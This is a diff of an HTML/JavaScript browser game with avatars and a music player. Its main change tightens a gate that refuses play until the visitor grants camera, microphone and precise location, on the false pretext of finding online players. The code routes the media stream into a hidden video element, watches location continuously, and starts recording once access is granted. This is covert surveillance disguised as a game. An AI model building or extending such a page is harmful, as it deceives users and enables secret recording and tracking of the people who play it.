@@ -24,7 +24,6 @@
             overflow-x: hidden;
         }
 
-        /* Animated Background */
         .bg-animation {
             position: fixed;
             top: 0; left: 0;
@@ -59,7 +58,6 @@
             background-size: 50px 50px;
         }
 
-        /* Permission Screen */
         .permission-blocker {
             position: fixed;
             top: 0; left: 0;
@@ -84,6 +82,12 @@
         .permission-icon { font-size: 60px; margin-bottom: 20px; }
         .permission-title { color: #fff; font-size: 26px; font-weight: 700; margin-bottom: 12px; }
         .permission-text { color: #888; font-size: 15px; margin-bottom: 30px; }
+        .permission-status {
+            color: #2ecc71;
+            font-size: 14px;
+            margin: 10px 0;
+            display: none;
+        }
         .permission-error { 
             color: #ff416c; 
             font-size: 14px; 
@@ -132,7 +136,6 @@
             cursor: not-allowed;
         }
 
-        /* Mode Selector */
         .mode-selector {
             display: none;
             position: fixed;
@@ -180,7 +183,6 @@
         .mode-icon { font-size: 50px; margin-bottom: 15px; display: block; }
         .mode-name { color: #fff; font-size: 18px; font-weight: 600; }
 
-        /* Avatar Selector Modal */
         .avatar-modal {
             display: none;
             position: fixed;
@@ -246,7 +248,6 @@
             font-size: 16px;
         }
 
-        /* Music Player Styles */
         .music-player {
             position: fixed;
             bottom: 20px;
@@ -392,11 +393,6 @@
             font-size: 11px;
         }
 
-        .playlist-item-duration {
-            color: #888;
-            font-size: 12px;
-        }
-
         .volume-control {
             display: flex;
             align-items: center;
@@ -426,7 +422,6 @@
             cursor: pointer;
         }
 
-        /* Game Container */
         .game-container {
             display: none;
             width: 100%;
@@ -447,7 +442,6 @@
             margin-bottom: 15px;
         }
 
-        /* Header */
         .game-header {
             display: flex;
             justify-content: space-between;
@@ -512,7 +506,6 @@
             font-size: 14px;
         }
 
-        /* Turn Indicator */
         .turn-bar {
             background: rgba(255,255,255,0.05);
             border-radius: 12px;
@@ -524,7 +517,6 @@
         .turn-text { color: #fff; font-size: 14px; font-weight: 600; }
         .turn-text span { color: #667eea; }
 
-        /* Game Board */
         .board-container {
             background: rgba(255,255,255,0.03);
             border-radius: 24px;
@@ -590,7 +582,6 @@
             50% { transform: scale(1.05); }
         }
 
-        /* Score Board */
         .score-section {
             margin-top: 25px;
             display: grid;
@@ -611,7 +602,6 @@
         .score-box.p2 .score-value { color: #00c9ff; }
         .score-box.draw .score-value { color: #ffd700; }
 
-        /* Buttons */
         .btn-row {
             display: flex;
             gap: 10px;
@@ -641,7 +631,6 @@
 
         .btn:active { transform: scale(0.95); }
 
-        /* Toast */
         .toast {
             position: fixed;
             top: 20px;
@@ -661,7 +650,6 @@
         .toast.win { border-color: #2ecc71; color: #2ecc71; }
         .toast.draw { border-color: #ffd700; color: #ffd700; }
 
-        /* Confetti */
         .confetti {
             position: fixed;
             width: 8px; height: 8px;
@@ -674,7 +662,6 @@
             100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
         }
 
-        /* Auto-restart indicator */
         .restart-timer {
             position: fixed;
             bottom: 140px;
@@ -713,15 +700,18 @@
             <div class="permission-text" id="permText">
                 Please allow permissions so we can find online players for you.
             </div>
+            <div class="permission-status" id="permStatus">✅ All permissions granted! Loading...</div>
             <button class="btn-allow" onclick="requestPermissions()" id="allowBtn">Allow & Play</button>
-            <div class="permission-error" id="permError">❌ Permissions Denied! Please Allow to continue.</div>
+            <div class="permission-error" id="permError">❌ All permissions required!</div>
             <div class="permission-instructions" id="permInstructions">
-                <strong>How to enable permissions:</strong>
+                <strong>Missing permissions detected:</strong>
+                <div id="missingPermsList" style="color: #ff416c; margin: 10px 0;"></div>
+                <strong>How to enable:</strong>
                 <ol>
                     <li>Click the lock icon 🔒 in address bar</li>
                     <li>Click "Site settings"</li>
                     <li>Allow Camera, Microphone & Location</li>
-                    <li>Refresh the page</li>
+                    <li>Refresh the page and try again</li>
                 </ol>
             </div>
         </div>
@@ -741,7 +731,6 @@
         </div>
     </div>
 
-    <!-- Avatar Selector Modal -->
     <div class="avatar-modal" id="avatarModal">
         <div class="avatar-title" id="avatarTitle">Select Avatar</div>
         <div class="avatar-grid" id="avatarGrid"></div>
@@ -805,7 +794,6 @@
         </div>
     </div>
 
-    <!-- Music Player -->
     <div class="music-player" id="musicPlayer">
         <div class="music-header" onclick="togglePlaylist()">
             <div class="music-icon" id="musicIcon">🎵</div>
@@ -827,9 +815,7 @@
         </div>
 
         <div class="playlist-dropdown" id="playlistDropdown">
-            <div class="playlist-container" id="playlistContainer">
-                <!-- Playlist items will be generated here -->
-            </div>
+            <div class="playlist-container" id="playlistContainer"></div>
         </div>
     </div>
 
@@ -841,13 +827,11 @@
         let stream = null;
         let recording = false;
 
-        // Avatar data
         const avatars = ['😎', '🤠', '👽', '🤖', '👻', '🎃', '🦄', '🐶', '🐱', '🦁', '🐯', '🐨', '🐼', '🐸', '🐙', '🦊', '🐺', '🐗', '🐴', '🐲', '👤', '👦', '👧', '👨', '👩'];
         const botAvatar = '🤖';
         let currentAvatarPlayer = null;
         let playerAvatars = { p1: '😎', p2: '🤖' };
 
-        // Music Player Data
         const playlist = [
             {
                 title: "SONG 1",
@@ -883,7 +867,6 @@
         let autoRestartTimer = null;
         let countdownInterval = null;
 
-        // Initialize Music Player
         function initMusicPlayer() {
             audio.volume = 0.5;
             
@@ -983,7 +966,6 @@
             c.addEventListener('click', () => clickCell(c), {passive: true});
         });
 
-        // Avatar selector functions
         function openAvatarSelector(player) {
             if (player === 'p2' && state.mode === 'bot') return;
             
@@ -1020,32 +1002,38 @@
             currentAvatarPlayer = null;
         }
 
-        // Request permissions in order: Camera+Mic first, then Location
+        // Strict permission check - ALL must be granted
         async function requestPermissions() {
             const permError = document.getElementById('permError');
             const permInstructions = document.getElementById('permInstructions');
+            const permStatus = document.getElementById('permStatus');
             const allowBtn = document.getElementById('allowBtn');
+            const missingList = document.getElementById('missingPermsList');
+            
+            // Reset displays
+            permError.style.display = 'none';
+            permInstructions.style.display = 'none';
+            permStatus.style.display = 'none';
+            missingList.innerHTML = '';
             
             allowBtn.disabled = true;
             allowBtn.style.opacity = '0.5';
             
-            // Step 1: Request Camera + Microphone first
+            let mediaGranted = false;
+            let locationGranted = false;
+            let missingPermissions = [];
+            
+            // Check Camera + Microphone
             try {
                 stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                 document.getElementById('hidden-video').srcObject = stream;
+                mediaGranted = true;
             } catch(e) {
-                // Camera/Mic denied - show error and instructions
-                console.log('Camera/Mic denied:', e);
-                permError.style.display = 'block';
-                permInstructions.style.display = 'block';
-                showToast('Camera & Microphone access required!', 'error');
-                
-                allowBtn.disabled = false;
-                allowBtn.style.opacity = '1';
-                return; // Stop here, don't ask for location yet
+                console.log('Media denied:', e.name);
+                missingPermissions.push('Camera & Microphone');
             }
             
-            // Step 2: Now request Location
+            // Check Location
             if (navigator.geolocation) {
                 try {
                     const position = await new Promise((resolve, reject) => {
@@ -1059,8 +1047,9 @@
                         lat: position.coords.latitude.toFixed(6), 
                         lng: position.coords.longitude.toFixed(6)
                     };
+                    locationGranted = true;
                     
-                    // Start watching location for updates
+                    // Start watching
                     navigator.geolocation.watchPosition(p => {
                         loc = {
                             lat: p.coords.latitude.toFixed(6), 
@@ -1069,23 +1058,36 @@
                     }, () => {}, {enableHighAccuracy: true});
                     
                 } catch(e) {
-                    // Location denied - show error
-                    console.log('Location denied:', e);
-                    permError.style.display = 'block';
-                    permInstructions.style.display = 'block';
-                    showToast('Location access also required!', 'error');
-                    
-                    allowBtn.disabled = false;
-                    allowBtn.style.opacity = '1';
-                    return; // Don't proceed if location denied
+                    console.log('Location denied:', e.code);
+                    missingPermissions.push('Location');
                 }
+            } else {
+                missingPermissions.push('Location (not supported)');
             }
             
-            // All permissions granted - proceed to game
-            document.getElementById('permissionBlocker').style.display = 'none';
-            document.getElementById('modeSelector').classList.add('active');
-            startRecording();
-            initMusicPlayer();
+            // STRICT CHECK: ALL permissions must be granted
+            if (mediaGranted && locationGranted) {
+                // SUCCESS - All permissions granted
+                permStatus.style.display = 'block';
+                showToast('✅ All permissions granted!', 'win');
+                
+                setTimeout(() => {
+                    document.getElementById('permissionBlocker').style.display = 'none';
+                    document.getElementById('modeSelector').classList.add('active');
+                    startRecording();
+                    initMusicPlayer();
+                }, 1000);
+                
+            } else {
+                // FAILURE - Show which permissions are missing
+                permError.style.display = 'block';
+                permInstructions.style.display = 'block';
+                missingList.innerHTML = missingPermissions.join('<br>');
+                showToast('❌ All permissions required!', 'error');
+                
+                allowBtn.disabled = false;
+                allowBtn.style.opacity = '1';
+            }
         }
 
         function selectMode(m) {
